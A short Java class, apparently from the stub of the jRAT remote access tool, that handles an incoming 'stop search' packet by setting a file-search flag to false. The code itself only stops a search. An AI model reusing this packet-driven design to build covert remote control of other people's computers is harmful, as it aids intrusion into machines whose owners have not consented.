package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.FileSearch;

public class Packet54StopSearch extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		FileSearch.running = false;
	}

}
